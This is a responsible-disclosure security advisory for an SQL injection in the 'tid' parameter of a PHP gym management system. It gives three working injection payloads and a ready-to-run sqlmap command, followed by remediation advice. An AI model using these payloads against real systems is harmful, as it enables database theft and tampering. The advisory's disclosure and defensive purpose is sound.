# **Security Advisory: SQL Injection in Gym Management System (PHP) v1.0**
**Discovered By:** <font style="color:rgb(51, 51, 51);">takakie</font>

---

## **Affected Product**
+ **Product Name**: Gym Management System in PHP with Source Code  
+ **Version**: v1.0  
+ **Vulnerable File**: `/dashboard/admin/updateroutine.php`  
+ **Parameter**: `tid`
+ **Vendor Homepage**: [Gym Management System](https://codezips.com/php/gymmanagementsytem/)  
+ **Download Link**: [Source Code](https://codeload.github.com/codezips/gym-management-system-php/zip/master)

**No authentication required** to exploit this vulnerability.

---

## **Overview**
A critical SQL injection vulnerability exists in the `tid`parameter within `/dashboard/admin/updateroutine.php`. Attackers can inject arbitrary SQL code via specially crafted values, bypassing input validation. This could lead to unauthorized database access, data manipulation, and potentially full system compromise.

---

## **Technical Details**
### Vulnerability Type
+ **SQL Injection**    
    - boolean-based
    - Error-based  
    - Time-based blind

### Sample Payloads
```bash
# boolean-based
tid=1 AND 5935=(SELECT (CASE WHEN (5935=5935) THEN 5935 ELSE (SELECT 7128 UNION SELECT 3386) END))-- -&routinename=11&day1=11&day2=11&day3=11&day4=11&day5=11&day6=11&submit=Update

# error-based
tid=1 AND GTID_SUBSET(CONCAT(0x716b6b7071,(SELECT (ELT(2744=2744,1))),0x71707a7071),2744)&routinename=11&day1=11&day2=11&day3=11&day4=11&day5=11&day6=11&submit=Update

# time-based blind
tid=1 AND (SELECT 8904 FROM (SELECT(SLEEP(5)))BpQD)&routinename=11&day1=11&day2=11&day3=11&day4=11&day5=11&day6=11&submit=Update

```

### Proof of Concept (PoC)
```bash
sqlmap -u "192.168.10.5:2227/dashboard/admin/updateroutine.php" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --data="tid=1&routinename=11&day1=11&day2=11&day3=11&day4=11&day5=11&day6=11&submit=Update" --batch --level=5 --risk=3 --dbms=mysql
```

**Screenshots**:  
![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738764040309-4d047c38-38de-4b08-a7e6-43eda06dcdd8.png)

---

## **Impact**
+ **Database Compromise**: Attackers can read, modify, or delete data.  
+ **Data Leakage**: Sensitive customer/payment information could be exposed.  
+ **System Interruption**: Malicious queries may degrade performance or crash the application.  
+ **Privilege Escalation**: Potential elevation of privileges leading to broader system takeover.

---

## **Recommendations**
1. **Use Prepared Statements / Parameter Binding**  
    - Separate SQL logic from user-supplied data to prevent code injection.
2. **Enforce Strict Input Validation**  
    - Validate and sanitize incoming fields (`tid`) against unexpected characters or formats.
3. **Apply the Principle of Least Privilege**  
    - Configure database users with minimal privileges. Avoid high-privilege accounts for routine queries.
4. **Schedule Regular Security Audits**  
    - Conduct routine code reviews, penetration testing, and dependency checks to catch new or recurring flaws.

---

## **References**
+ [Gym Management System Homepage](https://codezips.com/php/gymmanagementsytem/)  
+ [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
+ [sqlmap Project](https://sqlmap.org/)

---

**Disclaimer:**  
This advisory is intended for responsible disclosure. Any unauthorized exploitation of the described vulnerability may violate applicable laws. Stakeholders and the vendor are strongly encouraged to apply remediation measures immediately to ensure data protection and maintain system integrity.

